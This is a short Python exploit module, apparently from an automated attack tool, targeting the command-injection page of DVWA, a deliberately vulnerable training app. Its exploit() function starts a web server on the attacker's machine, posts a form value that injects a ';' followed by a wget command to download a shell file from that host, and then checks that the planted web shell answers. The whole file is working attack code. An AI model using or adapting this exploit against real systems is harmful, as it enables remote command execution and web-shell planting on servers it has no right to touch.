
import requests
import time
from core.network import *
from core.common import *
from urllib.parse import urljoin,urlparse


def exploit(url,cookies = {}):
    print("Try Dvwa Rce exploit :")
    
    # Start the http server for get shell from attacker machine
    host = urlparse(url).hostname
    ip = get_my_ip(host)
    port = 8000
    
    server = WebServer(host,port)
    server.run()

    shell_name = random_shell_name()
    headers = makeHeaders(host)

    payload = {
        "ip" : f";{wget_payload(lhost=ip,lport=port,shell_name=shell_name)}" ,
        "submit" : "submit"
    }

    vulnerable_path = "vulnerabilities/exec/"
    full_url = urljoin(url,vulnerable_path)
    time.sleep(10) 

    # send exploit
    
    requests.post(full_url,cookies=cookies,headers=headers,data=payload)
    server.stop()
    
    shell_path = urljoin(full_url,shell_name)
    check_exploit_succeed(shell_path,headers,'\t')

    print()